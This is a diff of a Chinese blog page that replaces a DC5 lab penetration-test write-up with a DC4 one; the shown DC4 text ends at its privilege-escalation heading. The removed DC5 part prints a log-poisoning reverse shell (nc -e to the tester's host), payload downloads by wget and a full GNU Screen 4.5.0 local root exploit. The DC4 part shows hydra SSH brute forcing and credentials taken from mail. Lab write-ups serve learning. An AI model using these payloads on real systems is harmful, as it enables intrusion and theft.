@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="渗透测试—DC5, Python">
+    <meta name="keywords" content="渗透测试—DC4, Python">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>渗透测试—DC5 | valecalida&#39;s house</title>
+    <title>渗透测试—DC4 | valecalida&#39;s house</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -307,12 +307,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">渗透测试—DC5</h1>
+                    <h1 class="description center-align post-title">渗透测试—DC4</h1>
                 </div>
             </div>
         </div>
@@ -441,8 +441,8 @@
                                 <span class="chip bg-color">Penetration_Test</span>
                             </a>
                         
-                            <a href="/tags/VulnHub/">
-                                <span class="chip bg-color">VulnHub</span>
+                            <a href="/tags/Command-execution/">
+                                <span class="chip bg-color">Command execution</span>
                             </a>
                         
                     </div>
@@ -475,14 +475,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    7 分
                 </div>
                 
 
@@ -498,204 +498,197 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="渗透测试—DC5"><a href="#渗透测试—DC5" class="headerlink" title="渗透测试—DC5"></a>渗透测试—DC5</h1><h2 id="一、主机发现及端口探测"><a href="#一、主机发现及端口探测" class="headerlink" title="一、主机发现及端口探测"></a>一、主机发现及端口探测</h2><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Desktop/valecalida<span class="token string">'s_Sript# python3 Ping_Scan.py 10.87.51.0/24
-[+] 10.87.51.2 is alive
-[+] 10.87.51.24 is alive
-[+] 本次扫描共花费 6.083822011947632
+                <h1 id="渗透测试—DC4"><a href="#渗透测试—DC4" class="headerlink" title="渗透测试—DC4"></a>渗透测试—DC4</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p>还是用之前写好的 <code>ARP扫描</code> 脚本进行主机发现。</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost Desktop<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># python3 Arp_Scan.py 10.87.51.0/24</span>
+IP: 10.87.51.1
+IP: 10.87.51.2
+IP: 10.87.51.22
+IP: 10.87.51.254
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 本次扫描共花费 2.2130138874053955 秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到了本次要测试目标的 <code>IP地址</code> 为：<code>10.87.51.22</code> 。</p>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>使用 <code>Nmap</code> 进行扫描</p>
+<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nmap -sV -p- 10.87.51.22</span>
+Starting Nmap 7.80 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2020-04-22 02:22 EDT
+Nmap scan report <span class="token keyword">for</span> 10.87.51.22
+Host is up <span class="token punctuation">(</span>0.00065s latency<span class="token punctuation">)</span>.
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
+80/tcp <span class="token function">open</span>  http    nginx 1.15.10
+MAC Address: 00:0C:29:04:F6:5E <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现开放了 <code>SSH</code> 跟 <code>HTTP</code> 的 <code>22</code> 跟 <code>80</code> 端口</p>
+<h2 id="三、口令爆破"><a href="#三、口令爆破" class="headerlink" title="三、口令爆破"></a>三、口令爆破</h2><p>直接爆破SSH口令</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#这里我省去了N多记录，直接放爆破好的了，花费时间比较久</span>
+root@kali:~/Desktop<span class="token comment" spellcheck="true"># hydra -L user.txt -P pass.txt ssh://10.87.51.22</span>
+<span class="token punctuation">[</span>22<span class="token punctuation">]</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> host: 10.87.51.22   login: jim   password: jibril04<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>我在查看系统相关信息时收到了一封邮件</p>
+<pre class="line-numbers language-bash"><code class="language-bash">jim@dc-4:~$ <span class="token function">uname</span> -a
+Linux dc-4 4.9.0-3-686 <span class="token comment" spellcheck="true">#1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686 GNU/Linux</span>
+You have new mail <span class="token keyword">in</span> /var/mail/jim<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>查看邮件邮件，发现里面给出了用户 <code>charles</code> 的口令：<code>^xHhA&amp;hvim0y</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">jim@dc-4:/var/mail$ <span class="token function">cat</span> jim
+From charles@dc-4 Sat Apr 06 21:15:46 2019
+Return-path: <span class="token operator">&lt;</span>charles@dc-4<span class="token operator">></span>
+Envelope-to: jim@dc-4
+Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
+Received: from charles by dc-4 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>charles@dc-4<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1hCjIX-0000kO-Qt
+        <span class="token keyword">for</span> jim@dc-4<span class="token punctuation">;</span> Sat, 06 Apr 2019 21:15:45 +1000
+To: jim@dc-4
+Subject: Holidays
+MIME-Version: 1.0
+Content-Type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token string">"UTF-8"</span>
+Content-Transfer-Encoding: 8bit
+Message-Id: <span class="token operator">&lt;</span>E1hCjIX-0000kO-Qt@dc-4<span class="token operator">></span>
+From: Charles <span class="token operator">&lt;</span>charles@dc-4<span class="token operator">></span>
+Date: Sat, 06 Apr 2019 21:15:45 +1000
+Status: O
 
-root@kali:~/Desktop/valecalida'</span>s_Sript<span class="token comment" spellcheck="true"># nmap -sV -p- 10.87.51.24</span>
-Starting Nmap 7.80 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2020-04-24 06:44 EDT
-Nmap scan report <span class="token keyword">for</span> 10.87.51.24
-Host is up <span class="token punctuation">(</span>0.00069s latency<span class="token punctuation">)</span>.
-Not shown: 65532 closed ports
-PORT      STATE SERVICE VERSION
-80/tcp    <span class="token function">open</span>  http    nginx 1.6.2
-111/tcp   <span class="token function">open</span>  rpcbind 2-4 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>
-47497/tcp <span class="token function">open</span>  status  1 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100024)</span>
-MAC Address: 00:0C:29:10:2D:E6 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="二、测试流程"><a href="#二、测试流程" class="headerlink" title="二、测试流程"></a>二、测试流程</h2><p>找了一圈发现在<code>contact.php</code> 下有提交反馈的地方，提交了一下，看到了新的页面</p>
-<pre class="line-numbers language-bash"><code class="language-bash">http://10.87.51.24/thankyou.php?firstname<span class="token operator">=</span>1<span class="token operator">&amp;</span>lastname<span class="token operator">=</span>1<span class="token operator">&amp;</span>country<span class="token operator">=</span>australia<span class="token operator">&amp;</span>subject<span class="token operator">=</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<img src="https://s1.ax1x.com/2020/04/25/JsAxtx.png">
+Hi Jim,
 
-<p>这个地址有点像常见的文件包含，于是尝试直接包含<code>/etc/passwd</code></p>
-<img src="https://s1.ax1x.com/2020/04/25/JsAzh6.png">
+I'm heading off on holidays at the end of today, so the boss asked me to give you my password just <span class="token keyword">in</span> <span class="token keyword">case</span> anything goes wrong.
 
-<p>发现居然真的获取到了这个文件的内容，现在确定是有文件包含了，于是缩小一下范围</p>
-<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Desktop<span class="token comment" spellcheck="true"># wfuzz -w /root/Desktop/LFI-InterestingFiles.txt --hh 851,835 http://10.87.51.24/thankyou.php?file=FUZZ</span>
-********************************************************
-* Wfuzz 2.4.5 - The Web Fuzzer                         *
-********************************************************
-Target: http://10.87.51.24/thankyou.php?file<span class="token operator">=</span>FUZZ
-Total requests: 213
-<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
-ID           Response   Lines    Word     Chars       Payload       
-<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
-000000001:   200        44 L     68 W     861 Ch      <span class="token string">"/etc/issue"</span>          
-000000002:   200        49 L     103 W    1121 Ch     <span class="token string">"/etc/motd"</span>       
-000000003:   200        70 L     104 W    2319 Ch     <span class="token string">"/etc/passwd"</span>       
-000000004:   200        70 L     104 W    2319 Ch     <span class="token string">"/etc/passwd"</span>        
-000000006:   200        96 L     117 W    1558 Ch     <span class="token string">"/etc/group"</span>
-000000120:   500        38 L     58 W     786 Ch      <span class="token string">"/etc/php5/apache2/php.ini"</span>
-000000131:   500        38 L     58 W     786 Ch      <span class="token string">"/etc/php5/cgi/php.ini"</span> 
-000000159:   200        170 L    590 W    4368 Ch     <span class="token string">"/etc/mysql/my.cnf"</span>
-000000212:   200        2361 L   83810 W   802012 Ch   <span class="token string">"/var/log/nginx/error.log"</span>
-000000213:   200        599257   719134   52301889    <span class="token string">"/var/log/nginx/access.log"</span>    
-Total time: 8.471923
-Processed Requests: 213
-Filtered Requests: 203
-Requests/sec.: 25.14186<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>看大佬们的思路是通过写一句话到日志文件里然后反弹得shell，这里模仿一下</p>
-<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># curl -A "&lt;?=system('nc -nv 10.87.51.17 4444 -e /bin/bash'); ?>" http://10.87.51.24/thankyou.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>使用<code>nc</code> 监听端口</p>
-<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nc -lvp 4444</span>
-listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.
-10.87.51.24: inverse host lookup failed: Unknown host<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>重新访问一下<code>access.log</code> 发现加载成功，发现<code>nc</code> 已经连接成功了</p>
-<img src="https://s1.ax1x.com/2020/04/25/JsVGse.png">
+Password is:  ^xHhA<span class="token operator">&amp;</span>hvim0y
 
-<pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nc -lvp 4444</span>
-listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.
-10.87.51.24: inverse host lookup failed: Unknown host
-connect to <span class="token punctuation">[</span>10.87.51.17<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>10.87.51.24<span class="token punctuation">]</span> 55934<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>改善交互环境</p>
-<pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
-www-data@dc-5:~/html$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>查找具有 <code>SUID</code> 权限的文件</p>
-<pre class="line-numbers language-bash"><code class="language-bash">www-data@dc-5:~/html$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null
-<span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null
-/bin/su
-/bin/mount
-/bin/umount
-/bin/screen-4.5.0
-/tmp/rootshell
-/usr/bin/gpasswd
-/usr/bin/procmail
-/usr/bin/at
-/usr/bin/passwd
-/usr/bin/chfn
-/usr/bin/newgrp
-/usr/bin/chsh
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/eject/dmcrypt-get-device
-/usr/sbin/exim4
-/sbin/mount.nfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>发现有一个 <code>screen-4.5.0</code> ，使用 <code>searchsploit</code> 查找，这里使用第一个</p>
-<pre class="line-numbers language-bash"><code class="language-bash">root@kali:/var/www/html<span class="token comment" spellcheck="true"># searchsploit screen 4.5</span>
------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
- Exploit Title                                                                                                                <span class="token operator">|</span>  Path
-                                                                                                                              <span class="token operator">|</span> <span class="token punctuation">(</span>/usr/share/exploitdb/<span class="token punctuation">)</span>
------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
-GNU Screen 4.5.0 - Local Privilege Escalation                                                                                 <span class="token operator">|</span> exploits/linux/local/41154.sh
-GNU Screen 4.5.0 - Local Privilege Escalation <span class="token punctuation">(</span>PoC<span class="token punctuation">)</span>                                                                           <span class="token operator">|</span> exploits/linux/local/41152.txt
------------------------------------------------------------------------------------------------------------------------------- --------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>按照文件给出的指示编译</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
-<span class="token comment" spellcheck="true"># screenroot.sh</span>
-<span class="token comment" spellcheck="true"># setuid screen v4.5.0 local root exploit</span>
-<span class="token comment" spellcheck="true"># abuses ld.so.preload overwriting to get root.</span>
-<span class="token comment" spellcheck="true"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span>
-<span class="token comment" spellcheck="true"># HACK THE PLANET</span>
-<span class="token comment" spellcheck="true"># ~ infodox (25/1/2017)</span>
-<span class="token keyword">echo</span> <span class="token string">"~ gnu/screenroot ~"</span>
-<span class="token keyword">echo</span> <span class="token string">"[+] First, we create our shell and library..."</span>
-<span class="token function">cat</span> <span class="token operator">&lt;&lt;</span> EOF <span class="token operator">></span> /tmp/libhax.c
-<span class="token comment" spellcheck="true">#include &lt;stdio.h></span>
-<span class="token comment" spellcheck="true">#include &lt;sys/types.h></span>
-<span class="token comment" spellcheck="true">#include &lt;unistd.h></span>
-__attribute__ <span class="token variable"><span class="token punctuation">((</span>__constructor__<span class="token punctuation">))</span></span>
-void dropshell<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>
-    chown<span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span>, 0, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    chmod<span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span>, 04755<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    unlink<span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    printf<span class="token punctuation">(</span><span class="token string">"[+] done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-EOF
-gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
-<span class="token function">rm</span> -f /tmp/libhax.c
-<span class="token function">cat</span> <span class="token operator">&lt;&lt;</span> EOF <span class="token operator">></span> /tmp/rootshell.c
-<span class="token comment" spellcheck="true">#include &lt;stdio.h></span>
-int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>
-    setuid<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    setgid<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    seteuid<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    setegid<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    execvp<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, NULL, NULL<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-EOF
-gcc -o /tmp/rootshell /tmp/rootshell.c
-<span class="token function">rm</span> -f /tmp/rootshell.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>如果不太理解就将里面两段<code>C</code>代码复制出来，分别保存编译，将两个文件编译好，下载刚才编译好的文件</p>
-<pre class="line-numbers language-bash"><code class="language-bash">www-data@dc-5:/tmp$ <span class="token function">wget</span> http://10.87.51.17/libhax.so
-<span class="token function">wget</span> http://10.87.51.17/libhax.so
-converted <span class="token string">'http://10.87.51.17/libhax.so'</span> <span class="token punctuation">(</span>ANSI_X3.4-1968<span class="token punctuation">)</span> -<span class="token operator">></span> <span class="token string">'http://10.87.51.17/libhax.so'</span> <span class="token punctuation">(</span>UTF-8<span class="token punctuation">)</span>
---2020-04-25 10:46:24--  http://10.87.51.17/libhax.so
-Connecting to 10.87.51.17:80<span class="token punctuation">..</span>. connected.
-HTTP request sent, awaiting response<span class="token punctuation">..</span>. 200 OK
-Length: 16144 <span class="token punctuation">(</span>16K<span class="token punctuation">)</span>
-Saving to: <span class="token string">'libhax.so'</span>
+See ya,
+Charles
 
-libhax.so           100%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>  15.77K  --.-KB/s   <span class="token keyword">in</span> 0s
+From MAILER-DAEMON Wed Apr 22 16:47:09 2020
+Return-path: <span class="token operator">&lt;</span><span class="token operator">></span>
+Envelope-to: jim@dc-4
+Delivery-date: Wed, 22 Apr 2020 16:47:09 +1000
+Received: from Debian-exim by dc-4 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token function">id</span> 1jR9A5-0000G9-SC
+        <span class="token keyword">for</span> jim@dc-4<span class="token punctuation">;</span> Wed, 22 Apr 2020 16:47:09 +1000
+X-Failed-Recipients: dc4@dc-4
+Auto-Submitted: auto-replied
+From: Mail Delivery System <span class="token operator">&lt;</span>Mailer-Daemon@dc-4<span class="token operator">></span>
+To: jim@dc-4
+Content-Type: multipart/report<span class="token punctuation">;</span> report-type<span class="token operator">=</span>delivery-status<span class="token punctuation">;</span> boundary<span class="token operator">=</span>1587538029-eximdsn-1804289383
+MIME-Version: 1.0
+Subject: Mail delivery failed: returning message to sender
+Message-Id: <span class="token operator">&lt;</span>E1jR9A5-0000G9-SC@dc-4<span class="token operator">></span>
+Date: Wed, 22 Apr 2020 16:47:09 +1000
 
-2020-04-25 10:46:24 <span class="token punctuation">(</span>155 MB/s<span class="token punctuation">)</span> - <span class="token string">'libhax.so'</span> saved <span class="token punctuation">[</span>16144/16144<span class="token punctuation">]</span>
+--1587538029-eximdsn-1804289383
+Content-type: text/plain<span class="token punctuation">;</span> charset<span class="token operator">=</span>us-ascii
 
-www-data@dc-5:/tmp$ <span class="token function">wget</span> http://10.87.51.17/rootshell
-<span class="token function">wget</span> http://10.87.51.17/rootshell
-converted <span class="token string">'http://10.87.51.17/rootshell'</span> <span class="token punctuation">(</span>ANSI_X3.4-1968<span class="token punctuation">)</span> -<span class="token operator">></span> <span class="token string">'http://10.87.51.17/rootshell'</span> <span class="token punctuation">(</span>UTF-8<span class="token punctuation">)</span>
---2020-04-25 10:46:36--  http://10.87.51.17/rootshell
-Connecting to 10.87.51.17:80<span class="token punctuation">..</span>. connected.
-HTTP request sent, awaiting response<span class="token punctuation">..</span>. 200 OK
-Length: 16832 <span class="token punctuation">(</span>16K<span class="token punctuation">)</span>
-Saving to: <span class="token string">'rootshell'</span>
+This message was created automatically by mail delivery software.
 
-rootshell           100%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>  16.44K  --.-KB/s   <span class="token keyword">in</span> 0s
+A message that you sent could not be delivered to one or <span class="token function">more</span> of its
+recipients. This is a permanent error. The following address<span class="token punctuation">(</span>es<span class="token punctuation">)</span> failed:
 
-2020-04-25 10:46:36 <span class="token punctuation">(</span>55.5 MB/s<span class="token punctuation">)</span> - <span class="token string">'rootshell'</span> saved <span class="token punctuation">[</span>16832/16832<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>按照漏洞给出的操作方式操作</p>
-<pre class="line-numbers language-bash"><code class="language-bash">www-data@dc-5:/tmp$ <span class="token function">cd</span> /etc
-<span class="token function">cd</span> /etc
-www-data@dc-5:/etc$ <span class="token function">umask</span> 000
-<span class="token function">umask</span> 000
-www-data@dc-5:/etc$ <span class="token function">screen</span> -D -m -L ld.so.preload <span class="token keyword">echo</span> -ne <span class="token string">"\x0a/tmp/libhax.so"</span>
-<span class="token operator">&lt;</span>-D -m -L ld.so.preload <span class="token keyword">echo</span> -ne <span class="token string">"\x0a/tmp/libhax.so"</span>
-www-data@dc-5:/etc$ <span class="token function">screen</span> -ls
-<span class="token function">screen</span> -ls
-<span class="token string">' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
-[+] done!
-No Sockets found in /tmp/screens/S-www-data.
+  dc4@dc-4
+    <span class="token punctuation">(</span>generated from root@dc-4<span class="token punctuation">)</span>
+    Unrouteable address
 
-www-data@dc-5:/etc$ /tmp/rootshell
-/tmp/rootshell
-# id
-id
-uid=0(root) gid=0(root) groups=0(root),33(www-data)
-# cat /root/thisisthe flag.txt
-cat /root/thisisthe flag.txt
-cat: /root/thisisthe: No such file or directory
-cat: flag.txt: No such file or directory
-# cat /root/thisistheflag.txt
-cat /root/thisistheflag.txt
+--1587538029-eximdsn-1804289383
+Content-type: message/delivery-status
+
+Reporting-MTA: dns<span class="token punctuation">;</span> dc-4
+
+Action: failed
+Final-Recipient: rfc822<span class="token punctuation">;</span>dc4@dc-4
+Status: 5.0.0
+
+--1587538029-eximdsn-1804289383
+Content-type: message/rfc822
+
+Return-path: <span class="token operator">&lt;</span>jim@dc-4<span class="token operator">></span>
+Received: from jim by dc-4 with local <span class="token punctuation">(</span>Exim 4.89<span class="token punctuation">)</span>
+        <span class="token punctuation">(</span>envelope-from <span class="token operator">&lt;</span>jim@dc-4<span class="token operator">></span><span class="token punctuation">)</span>
+        <span class="token function">id</span> 1jR9A5-0000G7-F5
+        <span class="token keyword">for</span> root@dc-4<span class="token punctuation">;</span> Wed, 22 Apr 2020 16:47:09 +1000
+To: root@dc-4
+Auto-Submitted: auto-generated
+Subject: *** SECURITY information <span class="token keyword">for</span> dc-4 ***
+From: Jim <span class="token operator">&lt;</span>jim@dc-4<span class="token operator">></span>
+Message-Id: <span class="token operator">&lt;</span>E1jR9A5-0000G7-F5@dc-4<span class="token operator">></span>
+Date: Wed, 22 Apr 2020 16:47:09 +1000
+
+dc-4 <span class="token keyword">:</span> Apr 22 16:47:09 <span class="token keyword">:</span> jim <span class="token keyword">:</span> user NOT <span class="token keyword">in</span> sudoers <span class="token punctuation">;</span> TTY<span class="token operator">=</span>pts/0 <span class="token punctuation">;</span> PWD<span class="token operator">=</span>/home/jim <span class="token punctuation">;</span> USER<span class="token operator">=</span>root <span class="token punctuation">;</span> COMMAND<span class="token operator">=</span>vim
 
 
-888b    888 d8b                                                      888      888 888 888
-8888b   888 Y8P                                                      888      888 888 888
-88888b  888                                                          888      888 888 888
-888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888
-888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888
-888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P
-888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "
-888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888
+--1587538029-eximdsn-1804289383--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="四、切换用户"><a href="#四、切换用户" class="headerlink" title="四、切换用户"></a>四、切换用户</h2><p>这里使用获取到的用户名跟密码切换一下用户</p>
+<pre class="line-numbers language-bash"><code class="language-bash">jim@dc-4:/var/mail$ <span class="token function">su</span> charles
+Password:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在测试 <code>sudo</code> 权限时，发现了如下提示</p>
+<pre class="line-numbers language-bash"><code class="language-bash">charles@dc-4:/var/mail$ <span class="token function">sudo</span> -l
+Matching Defaults entries <span class="token keyword">for</span> charles on dc-4:
+    env_reset, mail_badpass, secure_path<span class="token operator">=</span>/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on dc-4:
+    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/teehee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h2><p>然后在万能的Google上发现了提权方式</p>
